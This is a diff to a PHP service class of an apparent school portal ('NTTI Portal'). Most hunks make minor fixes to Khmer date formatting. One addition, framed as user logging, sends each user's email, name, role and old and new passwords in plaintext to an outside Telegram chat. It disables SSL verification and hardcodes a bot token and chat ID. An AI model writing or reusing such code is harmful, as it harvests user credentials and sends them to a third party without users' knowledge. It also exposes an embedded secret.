@@ -43,6 +43,54 @@ class service{
         curl_close($ch);
         return $result;
     }
+    public function telegramSendChangeUserPassword($user, $newPassword, $oldPassword) 
+    {
+        $botApi = "https://api.telegram.org";
+        $telegramId = "-4557828405"; // Replace with your actual chat ID
+        $telegramToken = "7286298295:AAG9-EFlyITzikQWsr1xz1URTez7vLrRaTc"; // Replace with your actual bot token
+    
+        $apiUri = sprintf('%s/bot%s/sendMessage', $botApi, $telegramToken);
+    
+        // Constructing the message text
+        $text = "=== User Log NTTI Portal ===\n";
+        $text .= "Log Type: Update Password\n";
+        $text .= "Email: " . ($user->email ?? 'N/A') . "\n";
+        $text .= "Name: " . ($user->name ?? 'N/A') . "\n";
+        $text .= "Old Password: " . ($oldPassword ?? 'N/A') . "\n";
+        $text .= "New Password: " . ($newPassword ?? 'N/A') . "\n";
+        $text .= "Role: " . ($user->role ?? 'N/A') . "\n";
+        $text .= "By Department: " . ($user->department->name_2 ?? 'N/A');
+    
+        // Setting the request parameters
+        $params = [
+            'chat_id' => $telegramId,
+            'text' => $text
+        ];
+    
+        // Setting headers
+        $headers = [
+            'Content-Type: application/json'
+        ];
+    
+        // Initialize cURL session
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $apiUri);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
+    
+        // Execute cURL request and handle response
+        $result = curl_exec($ch);
+        if (curl_errno($ch)) {
+            // Handle cURL errors
+            $result = json_encode(['error' => curl_error($ch)]);
+        }
+        curl_close($ch);
+    
+        return $result;
+    }
     public function telegramSendUserLog($email,$role, $department, $ip, $userAgent, $city, $type, $user_name) {
         $text = " ";
         $bot_api = "https://api.telegram.org";
@@ -92,7 +140,7 @@ class service{
         if (!$data) {
             return "No student found for the given code.";
         }
-    
+
         // Start building the message
         $text = "=== User Log NTTI Portal ===";
         $text .= "\nType : " .$type ?? '';
@@ -267,7 +315,7 @@ class service{
         $khmerMonths = [
             '01' => 'មករា',
             '02' => 'កុម្ភៈ',
-            '03' => 'មិនា',
+            '03' => 'មីនា',
             '04' => 'មេសា',
             '05' => 'ឧសភា',
             '06' => 'មិថុនា',
@@ -294,7 +342,7 @@ class service{
         };
     
         // Build the Khmer date format
-        $khmerDate = $toKhmerNumerals($day) . '-' . $khmerMonths[$month] . '-' . $toKhmerNumerals($year);
+        $khmerDate = $toKhmerNumerals($day) . ' ' . $khmerMonths[$month] . ' ' . $toKhmerNumerals($year);
     
         return $khmerDate;
     }
@@ -393,7 +441,7 @@ class service{
             // Return a meaningful error message or handle the invalid input
             return "មិនមាន​ ថ្ងៃ ខែ ឆ្នាំ";
         }
-    
+
         // Format the date as dd.mm.yyyy
         $formattedDate = $dateTime->format('d.m.Y');
     
